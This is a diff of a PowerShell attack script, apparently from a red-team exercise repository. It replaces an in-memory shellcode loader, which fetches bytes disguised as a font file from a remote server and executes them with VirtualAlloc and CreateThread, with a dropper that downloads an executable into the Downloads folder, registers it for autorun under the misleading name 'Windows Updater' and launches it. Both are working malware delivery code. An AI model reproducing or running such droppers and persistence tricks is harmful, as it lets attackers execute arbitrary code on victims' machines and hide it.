@@ -1,33 +1,21 @@
-$Win32 = @"
-using System;
-using System.Runtime.InteropServices;
-public class Win32 {
-[DllImport("kernel32")]
-public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
-    uint dwSize,
-    uint flAllocationType,
-    uint flProtect);
-[DllImport("kernel32", CharSet=CharSet.Ansi)]
-public static extern IntPtr CreateThread(
-    IntPtr lpThreadAttributes,
-    uint dwStackSize,
-    IntPtr lpStartAddress,
-    IntPtr lpParameter,
-    uint dwCreationFlags,
-    IntPtr lpThreadId);
-[DllImport("kernel32.dll", SetLastError=true)]
-public static extern UInt32 WaitForSingleObject(
-    IntPtr hHandle,
-    UInt32 dwMilliseconds);
-}
-"@
-Add-Type $Win32
+# Exe and Background
+$exeUrl = "https://github.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/raw/main/red-scripts/payloads/LETSFUCKINGGO.exe"
 
-$shellcode = (New-Object System.Net.WebCLient).DownloadData("http://security.psuccso.org:8080/balls.woff")
-if ($shellcode -eq $null) {Exit};
-$size = $shellcode.Length
+# Define the destination paths in the user's Downloads folder
+$exePath = "$env:USERPROFILE\Downloads\GumpBit.exe"
 
-[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40);
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
-$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
-[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+# Use WebClient to download the files
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($exeUrl, $exePath)
+
+# Cleanup WebClient
+$webClient.Dispose()
+
+# Set the registry keys to run the exe and change the bg
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Updater' -Value $exePath
+
+# Update the background
+Start-Process RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+# Run the binary
+Start-Process $exePath
